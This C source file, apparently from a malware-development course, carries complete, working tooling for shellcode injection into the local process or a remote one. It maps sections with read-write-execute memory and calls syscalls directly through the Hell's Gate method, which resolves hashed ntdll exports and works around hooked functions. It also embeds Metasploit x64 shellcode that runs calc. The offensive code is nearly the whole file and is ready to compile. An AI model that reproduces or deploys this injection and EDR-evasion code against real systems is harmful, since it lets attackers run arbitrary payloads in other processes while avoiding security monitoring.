// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>
#include "structs.h"


// comment to enable remote-injection code
//
#define LOCAL_INJECTION


#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// change the pid to thats of the process to target
#define PROCESS_ID	21636	
#endif // !LOCAL_INJECTION


// Syscalls Hashes Values
#define NtCreateSection_djb2 0x5687F81AC5D1497A
#define NtMapViewOfSection_djb2 0x0778E82F702E79D4
#define NtUnmapViewOfSection_djb2 0x0BF2A46A27B93797
#define NtClose_djb2 0x0DA4FA80EF5031E7
#define NtCreateThreadEx_djb2 0x2786FB7E75145F1A


/*
	printf("#define %s%s 0x%p \n", "NtCreateSection", "_djb2", (DWORD64)djb2("NtCreateSection"));
	printf("#define %s%s 0x%p \n", "NtMapViewOfSection", "_djb2", djb2("NtMapViewOfSection"));
	printf("#define %s%s 0x%p \n", "NtUnmapViewOfSection", "_djb2", djb2("NtUnmapViewOfSection"));
	printf("#define %s%s 0x%p \n", "NtClose", "_djb2", djb2("NtClose"));
	printf("#define %s%s 0x%p \n", "NtCreateThreadEx", "_djb2", djb2("NtCreateThreadEx"));
	printf("#define %s%s 0x%p \n", "NtWaitForSingleObject", "_djb2", djb2("NtWaitForSingleObject"));
*/


// this can be used instead of `SECTION_ALL_ACCESS` in NtCreateSection
#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)



/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();
//------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------


// x64 calc metasploit shellcode 
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



#ifdef LOCAL_INJECTION

BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------	
	// allocating local map view 
	HellsGate(pVxTable->NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %ld \n", pAddress, sViewSize);

//--------------------------------------------------------------------------	
	// writing the payload

	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAddress);
	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

//--------------------------------------------------------------------------	
	
	// executing the payload via thread creation

	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	
//--------------------------------------------------------------------------
	
	// unmpaing the local view
	/*
	HellsGate(pVxTable->NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	*/
	
	// closing the section handle
	HellsGate(pVxTable->NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

#endif // LOCAL_INJECTION



#ifdef REMOTE_INJECTION

BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
						pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// allocating local map view 
	
	HellsGate(pVxTable->NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

	// writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// allocating remote map view 
	HellsGate(pVxTable->NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

	// executing the payload via thread creation
	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pRemoteAddress);
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// unmpaing the local view
	/*
	HellsGate(pVxTable->NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	*/

	// closing the section handle
	HellsGate(pVxTable->NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

#endif // REMOTE_INJECTION



INT main() {
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

//--------------------------------------------------------------------------

	// Initializing the 'Table' structure ...
	VX_TABLE Table = { 0 };
	
	Table.NtCreateSection.dwHash = NtCreateSection_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateSection))
		return 0x1;
	
	Table.NtMapViewOfSection.dwHash = NtMapViewOfSection_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtMapViewOfSection))
		return 0x1;

	Table.NtUnmapViewOfSection.dwHash = NtUnmapViewOfSection_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtUnmapViewOfSection))
		return 0x1;

	Table.NtClose.dwHash = NtClose_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

//--------------------------------------------------------------------------

	// if local injection code 
#ifdef LOCAL_INJECTION
	if (!LocalMappingInjectionViaSyscalls(&Table, Payload, sizeof(Payload)))
		return 0x1;
#endif // LOCAL_INJECTION


//--------------------------------------------------------------------------
	
	// if remote injection code
#ifdef REMOTE_INJECTION
	// open a handle to the target process
	printf("[i] Targeting process of id : %d \n", PROCESS_ID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
	if (hProcess == NULL) {
		printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (!RemoteMappingInjectionViaSyscalls(&Table, hProcess, Payload, sizeof(Payload)))
		return 0x1;

#endif // REMOTE_INJECTION


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0x00;
}


//------------------------------------------------------------------------------------------------------------------------------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------





PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}
